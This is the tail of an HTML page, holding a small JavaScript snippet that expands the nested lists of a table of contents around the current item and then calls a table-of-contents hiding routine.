            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>
    </body>
</html>
